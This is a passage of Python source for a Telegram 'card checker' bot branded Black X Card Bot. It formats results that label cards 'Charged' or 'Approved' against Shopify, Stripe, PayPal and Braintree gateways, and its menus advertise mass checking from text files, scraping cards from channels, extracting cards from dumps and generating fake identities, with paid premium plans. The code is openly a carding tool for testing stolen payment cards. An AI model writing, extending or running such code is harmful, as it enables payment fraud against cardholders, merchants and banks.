                f"𝗖𝗖 ⇾ <code>{escaped_card}</code>\n"
                f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Dead\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No Response\n"
                f"𝗣𝗿𝗶𝗰𝗲 ⇾ $0.0 💸\n"
                f"𝗦𝗶𝘁𝗲 ⇾ Site Dead 🦂\n\n"
                f"<pre>𝗕𝗜𝗡 𝗜𝗣𝗻𝗳𝗼: {brand}\n"
                f"𝗕𝗮𝗻𝗸: {issuer}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {country_flag}</pre>\n\n"
                f"𝗧𝗼𝗼𝙠  {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"
            )
            await msg.edit_text(final_text, parse_mode=ParseMode.HTML)
            return

        # Process best result
        response_text = best_result.get("Response", "Unknown")
        price = best_result.get("Price", "0")
        gateway = best_result.get("Gateway", "Shopify")
        site_number = best_result.get("site_number", 1)

        # Determine status
        resp_upper = response_text.upper()
        
        # Charged patterns
        charged_patterns = [
            "ORDER CONFIRMED", "ORDER PLACED", "THANK YOU", 
            "CHARGED", "PAYMENT SUCCESS", "ORDER CONFIRMED!"
        ]
        
        approved_patterns = [
            "APPROVED", "Incorrect cvv"
        ]

        # Remove "APPROVED" from response text
        clean_response = response_text
        for pattern in approved_patterns:
            clean_response = re.sub(pattern, '', clean_response, flags=re.IGNORECASE)
        clean_response = clean_response.strip()

        if any(pattern in resp_upper for pattern in charged_patterns):
            header_status = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 💎"
        elif any(pattern in resp_upper for pattern in approved_patterns):
            header_status = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ☑️"
        elif "3D_AUTHENTICATION" in resp_upper:
            header_status = "<s>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</s> ❌"
        elif any(x in resp_upper for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "<s>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</s> ❌"
        else:
            header_status = "<s>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</s> ❌"

        # Format price
        try:
            price_display = f"${float(price):.1f}" if float(price) > 0 else "$0.0"
        except:
            price_display = "$0.0"

        elapsed_time = round(time.time() - start_time, 2)

        # Final message
        final_text = (
            f"{header_status}\n\n"
            f"𝗖𝗖 ⇾ <code>{escaped_card}</code>\n"
            f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {gateway}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {clean_response}\n"
            f"𝗣𝗿𝗶𝗰𝗲 ⇾ {price_display} 💸\n"
            f"𝗦𝗶𝘁𝗲 ⇾ {site_number}\n\n"
            f"<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand}\n"
            f"𝗕𝗮𝗻𝗸: {issuer}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {country_flag}</pre>\n\n"
            f"𝗧𝗼𝗼𝙠  {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"
        )

        await msg.edit_text(final_text, parse_mode=ParseMode.HTML)

    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        error_text = (
            f"<s>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</s> ❌\n\n"
            f"𝗖𝗖 ⇾ <code>{escape(card_input)}</code>\n"
            f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Error\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}\n"
            f"𝗣𝗿𝗶𝗰𝗲 ⇾ $0.0 💸\n"
            f"𝗦𝗶𝘁𝗲 ⇾ Site Dead 🦂\n\n"
            f"<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: N/A\n"
            f"𝗕𝗮𝗻𝗸: N/A\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: N/A</pre>\n\n"
            f"𝗧𝗼𝗼𝙠  {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙤𝙣𝙨"
        )
        await msg.edit_text(error_text, parse_mode=ParseMode.HTML)
        
        

from datetime import datetime
import logging
import re
import pytz
import requests
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user  # ✅ sirf yeh import

# === START MESSAGE AND MENUS ===
BULLET_GROUP_LINK = "https://t.me/BlackXCards"
OFFICIAL_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
DEV_LINK = "tg://resolve?domain=BlinkCarder"

# ===== MASS GATEWAY HANDLERS =====

async def mass_gateway_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Mass Gateway' button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "━━━━━ 𝙈𝙖𝙨𝙨 𝙂𝙖𝙩𝙚𝙬𝙖𝙮  ━━━━━\n\n"
        "➤ 𝘾𝙡𝙞𝙘𝙠 𝙏𝙝𝙚 𝘽𝙚𝙡𝙤𝙬 𝘽𝙪𝙩𝙩𝙤𝙣 👇"
    )

    keyboard = InlineKeyboardMarkup([
        # Line 1 - Two buttons
        [
            InlineKeyboardButton("𝙎𝙩𝙧𝙞𝙥𝙚", callback_data="mass_stripe_menu"),
            InlineKeyboardButton("𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮", callback_data="mass_shopify_menu")
        ],
        # Line 2 - Two new buttons
        [
            InlineKeyboardButton("𝙋𝙖𝙮𝙋𝙖𝙡", callback_data="mass_paypal_menu"),
            InlineKeyboardButton("𝙎𝙩𝙧𝙞𝙥𝙚 𝙎𝙠 𝘽𝙖𝙨𝙚𝙙", callback_data="mass_sk_stripe_menu")
        ],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def mass_paypal_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'PayPal' mass gateway button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝙈𝙖𝙨𝙨 𝙋𝙖𝙮𝙋𝙖𝙡\n\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ⇾ <code>/masspp</code>\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ⇾ 𝙊𝙣 🔥\n\n"
        "𝙏𝙮𝙥𝙚 ⇾ 𝙁𝙧𝙚𝙚 𝘼𝙣𝙙 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘽𝙤𝙩𝙝\n\n"
        "𝙐𝙨𝙖𝙜𝙚 ⇾ 𝙍𝙚𝙥𝙡𝙮 𝙒𝙞𝙩𝙝 .𝙩𝙭𝙩 𝙁𝙞𝙡𝙡 𝘼𝙣𝙙 𝘾𝙘𝙨 🦂"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Mass Gateway", callback_data="mass_gateway_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def mass_sk_stripe_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe SK Based' mass gateway button."""
    q = update.callback_query
    await q.answer()
    
    # Owner ID mention
    owner_id = "7254736651"  # Your owner ID
    owner_link = f"<a href='tg://user?id={owner_id}'>𝑶𝒘𝒏𝒆𝒓</a>"
    
    text = (
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝙎𝙩𝙧𝙞𝙥𝙚 1 𝘿𝙤𝙡𝙡𝙚𝙧 𝘾𝙝𝙖𝙧𝙜𝙚 𝙎𝙠 𝘽𝙖𝙨𝙚𝙙\n\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ⇾ <code>/sktxt</code>\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ⇾ 𝙊𝙣 🔥\n\n"
        "𝙏𝙮𝙥𝙚 ⇾ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙊𝙣𝙡𝙮 🦂\n\n"
        "𝙐𝙨𝙖𝙜𝙚 ⇾ 𝙍𝙚𝙖𝙙 𝘾𝙖𝙧𝙙 𝙁𝙧𝙤𝙢 .𝙩𝙭𝙩 𝙁𝙞𝙡𝙡 🦂\n\n"
        f"🌿 𝘿𝙢 𝙁𝙤𝙧 𝙋𝙖𝙞𝙙 𝙋𝙡𝙖𝙣 ➞ {owner_link}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Mass Gateway", callback_data="mass_gateway_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def mass_stripe_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe' mass gateway button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝙈𝙖𝙨𝙨 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\n\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ⇾ <code>/chktxt</code>\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ⇾ 𝙊𝙣 🔥"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Mass Gateway", callback_data="mass_gateway_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def mass_shopify_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Auto Shopify' mass gateway button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 💎\n\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ⇾ <code>/mtxt</code>\n"
        "⤷ 𝙐𝙨𝙚 ⇾ 𝑺𝒆𝒏𝒅 𝑻𝒙𝒕 𝑭𝒊𝒍𝒍 𝑨𝒏𝒅 𝑹𝒆𝒑𝒍𝒚 𝑾𝒊𝒕𝒉 𝑭𝒊𝒍𝒍\n"
        "⤷ 𝙎𝙩𝙖𝙩𝙪𝙨 ⇾ 𝙊𝙣 🔥"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Mass Gateway", callback_data="mass_gateway_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )       
    
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ultra-fast start with instant response"""
    user = update.effective_user
    
    try:
        # Get user data WITHOUT waiting (async but don't await)
        user_data_task = asyncio.create_task(get_user(user.id))
        
        # Prepare user info immediately
        user_full_name = user.first_name or "User"
        if user.last_name:
            user_full_name += f" {user.last_name}"
        
        # Create clickable name
        clickable_name = f'<a href="tg://user?id={user.id}">{user_full_name}</a>'
        
        # Get role from user data if available, otherwise use default
        user_data = await user_data_task if not user_data_task.done() else None
        plan = str(user_data.get("plan", "Free")).upper() if user_data else "Free"
        
        # Determine user role
        if user.id == OWNER_ID:
            user_role = "OWNER 🦂"
        elif user.id in ADMIN_IDS:
            user_role = "ADMIN 🔥"
        elif "PREMIUM" in plan.upper():
            user_role = "PREMIUM 💎"
        elif "PLUS" in plan.upper():
            user_role = "PLUS 🌤️"
        else:
            user_role = "FREE ⏳"
        
        # FINAL TEXT - DIRECTLY without loading
        final_text = (
            f"🌟 𝙃𝙚𝙡𝙡𝙤 {clickable_name}  [{user_role}]\n\n"
            f"💎 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝑩𝒍𝒂𝒄𝒌 𝒙 𝑪𝒂𝒓𝒅 𝘽𝙤𝙩\n\n"
            f"𝑰 𝒂𝒎 𝒚𝒐𝒖𝒓 𝒈𝒐-𝒕𝒐 𝒃𝒐𝒕, 𝒑𝒂𝒄𝒌𝒆𝒅 𝒘𝒊𝒕𝒉 𝒂 𝒗𝒂𝒓𝒊𝒆𝒕𝒚 𝒐𝒇 𝒈𝒂𝒕𝒆𝒔, "
            f"𝒕𝒐𝒐𝒍𝒔, 𝒂𝒏𝒅 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝒕𝒐 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒚𝒐𝒖𝒓 𝒆𝒙𝒑𝒆𝒓𝒊𝒆𝒏𝒄𝒆. "
            f"𝑬𝒙𝒄𝒊𝒕𝒆𝒅 𝒕𝒐 𝒔𝒆𝒆 𝒘𝒉𝒂𝒕 𝑰 𝒄𝒂𝒏 𝒅𝒐?\n\n"
            f"💎 𝙏𝙝𝙖𝙣𝙠 𝙔𝙤𝙪 𝙁𝙤𝙧 𝘾𝙝𝙤𝙤𝙨𝙞𝙣𝙚 𝘽𝙡𝙖𝙘𝙠 𝙓 𝘾𝙖𝙧𝙙 𝘽𝙤𝙩\n"
            f"👇 𝘾𝙡𝙞𝙘𝙠 𝙏𝙝𝙚 𝘽𝙪𝙩𝙩𝙤𝙣 𝙏𝙤 𝘼𝙘𝙘𝙚𝙨 𝙈𝙮 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝘴."
        )
        
        # Keyboard
        buttons = [
            [InlineKeyboardButton("𝙂𝙖𝙩𝙚𝙨", callback_data="gates_menu"),
             InlineKeyboardButton("𝙏𝙤𝙤𝙡𝙨", callback_data="tools_menu")],
            [InlineKeyboardButton("𝑶𝒘𝒏𝒆𝒓", url="tg://resolve?domain=BlinkCarder")]
        ]
        keyboard = InlineKeyboardMarkup(buttons)
        
        # Send photo with FINAL message immediately (NO LOADING)
        photo_url = "https://i.ibb.co/93nHh5Xj/IMG-20251104-185218-529.jpg"
        photo_msg = await update.message.reply_photo(
            photo=photo_url,
            caption=final_text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
        
    except Exception as e:
        logger.error(f"Start command error: {e}")
        # Simple fallback
        await update.message.reply_text(
            "🌟 Welcome to Black X Card Bot\n\nClick buttons below to get started!",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("𝙂𝙖𝙩𝙚𝙨", callback_data="gates_menu"),
                 InlineKeyboardButton("𝙏𝙤𝙤𝙡𝙨", callback_data="tools_menu")],
                [InlineKeyboardButton("𝑶𝒘𝒏𝒆𝒓", url="tg://resolve?domain=BlinkCarder")]
            ])
        )

async def tools_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Tools' button with pagination."""
    q = update.callback_query
    await q.answer()
    
    # Page 1 content
    page1_text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "               💸  𝙈𝙮 𝙏𝙤𝙤𝙡𝙨 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Scraper \n"
        "𝙐𝙨𝙚 ⇾ /scr (channel_link) (amt)\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Scrape from multiple channels \n"
        "𝙐𝙨𝙚 ⇾ /mc (link) (link) (amt)\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Payment Gateway Checker\n"
        "𝙐𝙨𝙚 ⇾ /gate\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ BIN lookup\n"
        "𝙐𝙨𝙚 ⇾ /bin\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Fake identity generator\n"
        "𝙐𝙨𝙚 ⇾ /fk\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Extract CCs from dumps\n"
        "𝙐𝙨𝙚 ⇾ /fl\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    # Keyboard with Next button
    keyboard = [
        [InlineKeyboardButton("➡️ Next", callback_data="tools_page_2")],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await q.edit_message_caption(
            caption=page1_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=page1_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

async def tools_page_2_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for Tools page 2."""
    q = update.callback_query
    await q.answer()
    
    # Page 2 content
    page2_text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "               💸  𝙈𝙮 𝙏𝙤𝙤𝙡𝙨 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Extract cards from file\n"
        "𝙐𝙨𝙚 ⇾ /open\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Redeem a bot code\n"
        "𝙐𝙨𝙚 ⇾ /redeem\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Welcome message\n"
        "𝙐𝙨𝙚 ⇾ /start\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "𝙉𝙖𝙢𝙚 ➵ Show all commands\n"
        "𝙐𝙨𝙚 ⇾ /cmds\n"
        "𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Online ✅\n"
        "𝙏𝙮𝙥𝙚 ↬ Free\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    # Keyboard with Back button
    keyboard = [
        [InlineKeyboardButton("⬅️ Back", callback_data="tools_page_1")],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await q.edit_message_caption(
            caption=page2_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=page2_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        



async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Gates' button."""
    q = update.callback_query
    await q.answer()

    text = (
        "━━━━ 💎 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙈𝙚𝙣𝙪 🧠 ━━━━\n\n"
        
        "<a href='https://t.me/BlackXCards'>⩙</a> <b>𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙖𝙪𝙩𝙝𝙚𝙣𝙩𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n"
        "<a href='https://t.me/BlackXCards'>⩙</a> <b>𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙥𝙖𝙮𝙢𝙚𝙣𝙩/𝙘𝙝𝙖𝙧𝙜𝙚 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n"
        "<a href='https://t.me/BlackXCards'>⩙</a> <b>𝐌𝐚𝐬𝐬 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘽𝙪𝙡𝙠 𝙘𝙖𝙧𝙙 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n\n"
        
        "🧠 <b>𝙉𝙚𝙚𝙙 𝘼𝙨𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚?</b> 🌟 <b>𝙁𝙪𝙡𝙡 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚!</b>"
    )

    keyboard = InlineKeyboardMarkup([
        # ✅ Auth, Charge aur Mass Gateway teeno buttons
        [
            InlineKeyboardButton("𝘼𝙪𝙩𝙝", callback_data="auth_sub_menu"),
            InlineKeyboardButton("𝘾𝙝𝙖𝙧𝙜𝙚", callback_data="charge_gateway_menu")
        ],
        # ✅ Mass Gateway button alag line mein
        [
            InlineKeyboardButton("𝙈𝙖𝙨𝙨 𝙂𝙖𝙩𝙚𝙬𝙖𝙮", callback_data="mass_gateway_menu")
        ],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )


async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Auth' button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "━━━━━━ 𝘼𝙪𝙩𝙝 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ━━━━━━\n\n"
        "➤ <b>𝘾𝙡𝙞𝙘𝙠 𝙏𝙝𝙚 𝘽𝙚𝙡𝙤𝙬 𝘽𝙪𝙩𝙩𝙤𝙣 👇</b>"
    )

    keyboard = InlineKeyboardMarkup([
        # ✅ एक ही line में दो buttons
        [
            InlineKeyboardButton("𝙎𝙩𝙧𝙞𝙥𝙚", callback_data="stripe_auth_menu"),
            InlineKeyboardButton("𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚", callback_data="braintree_auth_menu")
        ],
        [InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def stripe_auth_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe' auth button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝙎𝙩𝙧𝙞𝙥𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝 ➜</b>\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 <code>/chk</code> [𝙎𝙞𝙣𝙜𝙡𝙚]\n"
        " 𝐒𝐭𝐚𝐭𝐮𝐬     ➜  𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        "──────────────────────\n"
        "<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 ➜</b>\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 <code>/sr</code> [𝙎𝙞𝙣𝙜𝙡𝙚]\n"
        " 𝐒𝐭𝐚𝐭𝐮𝐬     ➜  𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        "──────────────────────\n"
        "<b>𝙎𝙩𝙧𝙞𝙥𝙚 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 ➜</b>\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ⇾ <code>/mass</code> [𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜]\n"
        " 𝐒𝐭𝐚𝐭𝐮𝐬    ➜ 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Auth Menu", callback_data="auth_sub_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
        
        
async def braintree_auth_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Braintree' auth button."""
    q = update.callback_query
    await q.answer()
    
    text = (
        "<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↬ 𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝 ➜</b>\n"
        "⤷ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 <code>/b3</code> [𝙎𝙞𝙣𝙜𝙡𝙚]\n"
        "──────────────────────\n"
        "<b>𝙈𝙖𝙨𝙨 𝘾𝙝𝙠 𝘾𝙤𝙢𝙞𝙣𝙜 𝙎𝙤𝙤𝙣 🧠🤞</b>"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Auth Menu", callback_data="auth_sub_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )        


from telegram import InlineKeyboardButton, InlineKeyboardMarkup

async def charge_gateway_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Charge' button."""
    q = update.callback_query
    await q.answer()

    text = (
        "━━━━━ 𝘾𝙝𝙖𝙧𝙜𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ━━━━━\n\n"
        "🧠 <b>𝘾𝙡𝙞𝙘𝙠 𝙏𝙝𝙚 𝘽𝙚𝙡𝙤𝙬 𝘽𝙪𝙩𝙩𝙤𝙣 𝙏𝙤 𝘼𝙘𝙘𝙚𝙨 𝘾𝙝𝙖𝙧𝙜𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 💎👇</b>"
    )

    keyboard = InlineKeyboardMarkup([
        # ✅ Line 1 - 2 buttons
        [
            InlineKeyboardButton("💎 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮", callback_data="auto_shopify_menu"),
            InlineKeyboardButton("𝙎𝙠 𝘽𝙖𝙨𝙚𝙙", callback_data="sk_based_menu")
        ],
        # ✅ Line 2 - 2 buttons  
        [
